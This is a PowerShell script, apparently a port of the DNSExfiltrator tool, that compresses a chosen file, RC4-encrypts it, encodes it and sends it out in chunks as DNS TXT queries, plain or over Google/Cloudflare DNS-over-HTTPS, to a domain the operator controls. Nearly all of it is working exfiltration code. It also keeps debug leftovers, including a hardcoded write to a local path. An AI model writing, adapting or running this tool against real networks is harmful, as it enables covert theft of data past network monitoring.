# Requires PowerShell 5.1 or later

Add-Type -AssemblyName System.IO.Compression
Add-Type -AssemblyName System.Web.Extensions

# Function to print colored output
function PrintColor {
    param(
        [string]$text
    )
    if ($text.StartsWith("[!]")) {
        Write-Host $text -ForegroundColor Red
    } elseif ($text.StartsWith("[+]")) {
        Write-Host $text -ForegroundColor Green
    } elseif ($text.StartsWith("[*]")) {
        Write-Host $text -ForegroundColor Blue
    } else {
        Write-Host $text
    }
}

# Function to convert bytes to Base64URL
function ToBase64URL {
    param(
        [byte[]]$data
    )
    return [Convert]::ToBase64String($data) -replace '=', '' -replace '/', '_' -replace '\+', '-'
}

# Function to convert bytes to Base32
function ToBase32 {
    param(
        [byte[]]$data
    )
    $base32Alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"
    $lookupTable = @{}
    for ($i = 0; $i -lt $base32Alphabet.Length; $i++) {
        $lookupTable[$i] = $base32Alphabet[$i]
    }

    $result = ""
    $buffer = 0
    $bitsLeft = 0

    for ($i = 0; $i -lt $data.Length; $i++) {
        $buffer = ($buffer -shl 8) + $data[$i]
        $bitsLeft += 8

        while ($bitsLeft -ge 5) {
            $index = ($buffer -shr ($bitsLeft - 5)) -band 0x1f
            $result += $lookupTable[$index]
            $bitsLeft -= 5
        }
    }

    if ($bitsLeft -gt 0) {
        $index = ($buffer -shl (5 - $bitsLeft)) -band 0x1f
        $result += $lookupTable[$index]
    }

    return $result
}

# Function to perform RC4 encryption
function RC4Encrypt {
    param(
        [byte[]]$key,
        [byte[]]$data
    )
    $s = 0..255 | ForEach-Object { [byte]$_ }
    $j = 0

    for ($i = 0; $i -lt 256; $i++) {
        $j = ($j + $key[$i % $key.Length] + $s[$i]) % 256
        $s[$i], $s[$j] = $s[$j], $s[$i]
    }

    $i = 0
    $j = 0
    $result = @()

    for ($k = 0; $k -lt $data.Length; $k++) {
        $i = ($i + 1) % 256
        $j = ($j + $s[$i]) % 256
        $s[$i], $s[$j] = $s[$j], $s[$i]
        $result += [byte]($data[$k] -bxor $s[($s[$i] + $s[$j]) % 256])
    }

    return $result
}

# Function to resolve TXT record using DNS over HTTPS (DoH)
function Resolve-DohTxtRecord {
    param(
        [string]$dohProvider,
        [string]$domain
    )
    $googleDohUri = "https://dns.google.com/resolve?name="
    $cloudflareDohUri = "https://cloudflare-dns.com/dns-query?ct=application/dns-json&name="

    switch ($dohProvider) {
        "google" { $dohQuery = "$googleDohUri$domain&type=TXT" }
        "cloudflare" { $dohQuery = "$cloudflareDohUri$domain&type=TXT" }
        default { throw "Invalid DoH provider: $dohProvider" }
    }

    try {
        $response = Invoke-WebRequest -Uri $dohQuery -UseBasicParsing
        $json = $response.Content -replace '\\"', '' # Remove escaped double quotes
        $responseObject = ConvertFrom-Json $json

        if ($responseObject.Answer.Count -ge 1) {
            return $responseObject.Answer.data
        } else {
            throw "DNS answer does not contain a TXT resource record."
        }
    } catch {
        throw "Failed to resolve TXT record using DoH: $($_.Exception.Message)"
    }
}

# Function to resolve TXT record using System.Net.Dns
function Resolve-DnsTxtRecord {
    param(
        [string]$domain,
        [string]$dnsServer = $null
    )
    try {
        #$dnsClient = [System.Net.Dns]::GetHostEntry($domain)
        $dnsClient = Resolve-DnsName -Type TXT $domain
        #$txtRecords = $dnsClient.AddressList | Where-Object { $_.AddressFamily -eq 'InterNetwork' } | ForEach-Object { $_.IPAddressToString }
        $txtRecords = $dnsClient
        return $txtRecords
    } catch {
        throw "Failed to resolve TXT record: $($_.Exception.Message)"
    }
}

# Main function
function DNSExfiltrator {
    param(
        [string]$filePath,
        [string]$domainName,
        [string]$password,
        [switch]$useBase32,
        [string]$dohProvider = $null,
        [string]$dnsServer = $null,
        [int]$throttleTime = 0,
        [int]$requestMaxSize = 255,
        [int]$labelMaxSize = 63
    )

    # Check if file exists
    if (!(Test-Path $filePath)) {
        PrintColor "[!] File not found: $filePath"
        return
    }

    $fileName = Split-Path $filePath -Leaf

    # Compress the file
    PrintColor "[*] Compressing (ZIP) the [$filePath] file in memory"
    $zipStream = New-Object System.IO.MemoryStream
    # $Create = [System.IO.Compression.ZipArchiveMode] "Create"
    $archive = New-Object System.IO.Compression.ZipArchive($zipStream, 1, $true)
    $entry = $archive.CreateEntry($fileName)
    $entryStream = $entry.Open()
    $streamWriter = New-Object System.IO.BinaryWriter($entryStream)
    $streamWriter.Write([System.IO.File]::ReadAllBytes($filePath))
    $streamWriter.Close()
    $entryStream.Close()
    $archive.Dispose()
    $zipStream.Seek(0, [System.IO.SeekOrigin]::Begin)

    $zipStream.ToArray() | Format-Hex
    [System.IO.File]::WriteAllBytes("c:\users\win10-template\downloads\foo.zip", $zipStream.ToArray())

    # Encrypt the compressed data
    PrintColor "[*] Encrypting the ZIP file with password [$password]"
    $encryptedData = RC4Encrypt -key ([System.Text.Encoding]::UTF8.GetBytes($password)) -data $zipStream.ToArray()
    # $encryptedData | Format-Hex
    
    $zipStream.Dispose()

    # Encode the data
    if ($useBase32) {
        PrintColor "[*] Encoding the data with Base32"
        $data = ToBase32 $encryptedData
    } else {
        PrintColor "[*] Encoding the data with Base64URL"
        $data = ToBase64URL $encryptedData
    }

    PrintColor "[*] Total size of data to be transmitted: [${data.Length}] bytes"

    # Calculate chunk sizes
    $bytesLeft = $requestMaxSize - 10 - ($domainName.Length + 2)
    $nbFullLabels = [Math]::Floor($bytesLeft / ($labelMaxSize + 1))
    $smallestLabelSize = $bytesLeft % ($labelMaxSize + 1) - 1
    $chunkMaxSize = $nbFullLabels * $labelMaxSize + $smallestLabelSize
    $nbChunks = [Math]::Ceiling($data.Length / $chunkMaxSize)

    PrintColor "[+] Maximum data exfiltrated per DNS request (chunk max size): [$chunkMaxSize] bytes"
    PrintColor "[+] Number of chunks: [$nbChunks]"

    # Send init request
    $encoding = if ($useBase32) { "base32" } else { "base64" }
    $initRequest = "init." + (ToBase32 ([System.Text.Encoding]::UTF8.GetBytes("$fileName|$nbChunks"))) + ".$encoding.$domainName"
    PrintColor "[*] Sending 'init' request"

    try {
        $reply = if ($dohProvider) {
            Resolve-DohTxtRecord -dohProvider $dohProvider -domain $initRequest
        } else {
            Resolve-DnsTxtRecord -domain $initRequest -dnsServer $dnsServer
        }
        $reply
        $reply.Strings
        if ($reply.Strings[0] -ne "OK") {
            
            PrintColor "[!] Unexpected answer for an initialization request: [$reply]"
            return
        }
    } catch {
        PrintColor "[!] Failed to send init request: $($_.Exception.Message)"
        return
    }

    # Send data chunks
    PrintColor "[*] Sending data..."
    $chunkIndex = 0
    $data
    for ($i = 0; $i -lt $data.Length; ) {
        # Get a chunk of data
        $chunk = $data.Substring($i, [Math]::Min($chunkMaxSize, $data.Length - $i))
        $chunkLength = $chunk.Length

        # Build the request
        $request = "$chunkIndex."

        # Split chunk into labels
        for ($j = 0; $j * $labelMaxSize -lt $chunkLength; $j++) {
            $request += $chunk.Substring($j * $labelMaxSize, [Math]::Min($labelMaxSize, $chunkLength - ($j * $labelMaxSize))) + "."
        }

        $request += $domainName

        # Send the request
        try {
            $reply = if ($dohProvider) {
                Resolve-DohTxtRecord -dohProvider $dohProvider -domain $request
            } else {
                Resolve-DnsTxtRecord -domain $request -dnsServer $dnsServer
            }

            #$reply
            #$reply.Strings

            $countACK = [int]$reply.Strings[0]

            if ($countACK -ne $chunkIndex) {
                PrintColor "[!] Chunk number [$countACK] lost. Resending."
            } else {
                $i += $chunkMaxSize
                $chunkIndex++
            }
        } catch {
            PrintColor "[!] Failed to send data chunk: $($_.Exception.Message)"
            return
        }

        # Throttle
        if ($throttleTime -ne 0) {
            Start-Sleep -Milliseconds $throttleTime
        }
    }

    PrintColor "[*] DONE!"
}

# Example usage
#DNSExfiltrator -filePath "C:\path\to\file.txt" -domainName "example.com" -password "secret" -useBase32 -dohProvider "google" -throttleTime 100
